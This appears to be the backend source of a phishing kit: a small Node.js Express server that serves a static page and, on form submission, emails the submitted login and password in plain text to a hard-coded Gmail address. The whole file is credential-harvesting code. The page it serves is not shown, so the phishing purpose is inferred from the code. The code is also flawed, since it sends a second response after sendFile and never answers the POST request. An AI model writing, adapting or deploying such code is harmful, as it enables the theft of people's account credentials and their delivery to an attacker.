import  Express, { json } from "express";
import nodemailer from "nodemailer"
import { mailer } from "./nodemailer.js";
import path from "path"

const app=Express()
app.use(Express.urlencoded())
app.use(Express.json())
app.use(Express.static("html"))
app.get("/",(req,res)=>{
    res.sendFile(path.resolve("html/index.html"))
res.send()
})


app.post("/",(req,res)=>{
   // res.send(`${req.body.login}`)
     const message={
        to:"haykoqweqwe1@gmail.com",
        subject:"message from node js",
        text:` login ${req.body.login}, password ${req.body.password} `
         }
 mailer(message)

 })

app.listen(3000) 